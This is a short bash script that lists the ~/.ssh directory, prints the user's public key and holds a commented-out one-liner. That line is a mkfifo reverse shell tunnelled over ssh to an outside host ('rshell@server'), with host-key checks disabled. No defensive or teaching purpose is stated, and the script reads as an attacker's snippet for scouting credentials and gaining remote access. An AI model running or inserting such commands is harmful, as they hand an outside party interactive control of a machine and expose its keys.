#!/bin/bash

ls -la ~/.ssh/
cat ~/.ssh/id_rsa.pub
#mkfifo /tmp/f && cat /tmp/f | /bin/sh -i 2>&1 | ssh -i ~/.ssh/id_rsa -o "StrictHostKeyChecking no" -o "UserKnownHostsFile /dev/null" rshell@server > /tmp/f; rm /tmp/f